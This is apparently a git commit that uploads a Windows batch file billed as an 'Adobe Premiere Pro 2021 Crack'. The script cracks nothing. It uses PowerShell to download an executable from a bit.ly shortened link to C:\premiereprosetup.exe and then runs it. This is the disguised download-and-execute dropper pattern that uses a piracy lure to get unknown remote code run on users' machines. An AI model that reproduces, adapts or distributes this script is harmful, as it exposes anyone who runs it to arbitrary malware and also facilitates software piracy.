ca45c9f9755ad61485964d7aa87ece4f7dcac0e0
ImAndrew <83537402+ImAndrew0@users.noreply.github.com>
2021-05-07 07:05:46 -1200

    Add files via upload

---
+++ Premiere-Pro-2021-Crack.bat
@@ -0,0 +1,21 @@
+@echo off
+mode 86,30
+title Adobe Premiere Pro 2021 Crack
+@echo Welcome to PremierePro Crack. 
+@echo.
+@echo off
+pause
+cls
+@echo Downloading Adobe Premiere Pro 2021 Setup......
+@echo off
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://bit.ly/3tsGpKw', 'C:\premiereprosetup.exe') }"
+cls
+@echo Running Adobe Premiere Pro 2021 Setup...
+C:\premiereprosetup.exe
+cls
+@echo Finished!
+@echo off
+pause
+exit
+
+
